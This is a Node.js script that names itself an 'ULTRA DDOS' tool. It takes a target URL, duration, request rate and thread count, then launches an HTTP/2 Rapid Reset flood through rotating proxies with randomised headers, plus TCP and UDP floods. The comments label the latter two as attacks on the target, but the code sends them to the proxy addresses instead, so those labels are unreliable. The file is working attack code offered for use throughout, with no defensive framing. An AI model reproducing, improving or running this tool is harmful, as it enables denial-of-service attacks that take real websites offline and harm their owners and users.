const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const dgram = require("dgram");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`\n                          ULTRA DDOS METHOD!\n               node ultra_ddos.js [URL] [TIME] [RPS] [THREAD]\n`);
    process.exit();
}

const cplist = [
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:HIGH:!aNULL:!MD5:!RC4",
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:RSA-PSS-RSAE-SHA512:RSA-PKCS1-SHA512:RSA-PSS-RSAE-SHA384:RSA-PKCS1-SHA384:RSA-PSS-RSAE-SHA256:RSA-PKCS1-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:DHE-DSS-AES128-GCM-SHA256:AES256-SHA:AES128-SHA:HIGH:!aNULL:!MD5:!RC4",
    "ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5",
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:HIGH:!aNULL:!MD5",
    "AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA:HIGH:!aNULL:!MD5:!RC4",
    "DHE-RSA-AES128-SHA256:DHE-DSS-AES128-SHA256:HIGH:!aNULL:!MD5",
    "ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:HIGH:!aNULL:!MD5",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:AES256-SHA:HIGH:!aNULL:!MD5:!3DES",
    "DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA256:HIGH:!aNULL:!MD5",
    "ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:HIGH:!aNULL:!MD5",
    "AES128-SHA:AES256-SHA:AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

var proxyFile = "proxy.txt";
var proxies = readLines(proxyFile);
var userAgents = readLines("ua.txt");

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    console.clear();
    console.log(`\n     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n       TARGET : ` + parsedTarget.host + `\n       DURATION : ` + args.time + `\n       THREADS : ` + args.threads + `\n       RPS : ` + args.Rate + `\n       MODE : ULTRA AGGRESSIVE\n     ┣━━━━━━━━━━━━━━━     ATTACK STARTED     ━━━━━━━━━━━━━━━━━┫\n     ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n`);

    setTimeout(() => {
        process.exit(1);
    }, process.argv[3] * 1000);

} else {
    // Multiple attack vectors
    for (let i = 0; i < 50; i++) {
        setInterval(runHTTP2Flooder, 0);
        setInterval(runTCPFlooder, 0);
        setInterval(runUDPFlooder, 0);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.2\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
    } catch (e) {
        return ["127.0.0.1:8080"];
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// HTTP/2 Rapid Reset Attack
function runHTTP2Flooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const cipper = cplist[Math.floor(Math.random() * cplist.length)];

    const headers = {
        ":method": "GET",
        ":path": parsedTarget.path + "?" + randomString(10),
        ":scheme": "https",
        ":authority": parsedTarget.host,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.5",
        "accept-encoding": "gzip, deflate, br",
        "user-agent": randomElement(userAgents),
        "x-forwarded-for": parsedProxy[0],
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": "https://" + parsedTarget.host + "/",
        "origin": "https://" + parsedTarget.host,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "upgrade-insecure-requests": "1"
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const secureContextOptions = {
            ciphers: cipper,
            sigalgs: sigalgs,
            honorCipherOrder: true,
            secureOptions: secureOptions,
            secureProtocol: secureProtocol
        };

        const secureContext = tls.createSecureContext(secureContextOptions);

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipper,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                enablePush: false,
                initialWindowSize: 1073741823,
                maxFrameSize: 16777215,
                maxConcurrentStreams: 1000,
                maxHeaderListSize: 262144,
                headerTableSize: 65536
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);

        client.on("connect", () => {
            // Rapid Reset: Create many streams and immediately reset them
            const rapidResetInterval = setInterval(() => {
                for (let i = 0; i < args.Rate * 2; i++) {
                    const request = client.request(headers);
                    
                    // Immediately reset the stream (Rapid Reset technique)
                    setImmediate(() => {
                        request.close();
                        request.destroy();
                    });
                    
                    request.on("error", () => {});
                    request.end();
                }
            }, 100);

            setTimeout(() => {
                clearInterval(rapidResetInterval);
                client.destroy();
                connection.destroy();
            }, 30000);
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

// TCP SYN Flood Attack
function runTCPFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    for (let i = 0; i < args.Rate; i++) {
        const socket = new net.Socket();
        socket.setTimeout(1000);
        
        socket.connect(parsedProxy[1], parsedProxy[0], () => {
            socket.destroy();
        });

        socket.on("error", () => {
            socket.destroy();
        });

        socket.on("timeout", () => {
            socket.destroy();
        });
    }
}

// UDP Flood Attack
function runUDPFlooder() {
    const client = dgram.createSocket("udp4");
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    for (let i = 0; i < args.Rate; i++) {
        const message = Buffer.from(randomString(1024));
        
        client.send(message, 0, message.length, parsedProxy[1], parsedProxy[0], (err) => {
            if (err) client.close();
        });
    }

    setTimeout(() => {
        client.close();
    }, 5000);
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);

process.on("uncaughtException", error => {});
process.on("unhandledRejection", error => {});

